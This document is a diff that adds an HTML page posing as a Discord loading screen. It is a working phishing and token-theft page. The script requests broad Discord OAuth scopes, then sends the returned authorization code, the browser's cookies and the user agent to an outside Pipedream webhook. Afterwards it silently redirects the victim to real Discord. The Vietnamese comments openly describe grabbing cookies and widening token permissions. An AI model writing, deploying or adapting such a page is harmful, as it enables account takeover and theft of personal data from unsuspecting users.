@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading Discord...</title></head>
+<body>
+    <script>
+        const MY_WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
+        const CLIENT_ID = "1457055712411914377";
+        
+        const params = new URLSearchParams(window.location.search);
+        const code = params.get('code');
+
+        if (code) {
+            // Đã có code từ Discord, giờ lấy Cookie và gửi về Pipedream
+            fetch(MY_WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    code: code,
+                    cookies: document.cookie, // Đây là lúc hốt cookie
+                    user_agent: navigator.userAgent
+                })
+            }).then(() => {
+                // Gửi xong thì đẩy vào Discord thật cho họ dùng
+                window.location.href = "https://discord.com/channels/@me";
+            });
+        } else {
+            // Chưa có code, đẩy sang trang xác thực của Discord
+            const redirect = encodeURIComponent(window.location.href);
+            // Thêm quyền rpc để token mạnh hơn, tránh bị chớp màn hình
+            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code&scope=identify+email+guilds.join+messages.read+rpc`;
+        }
+    </script>
+</body>
+</html>
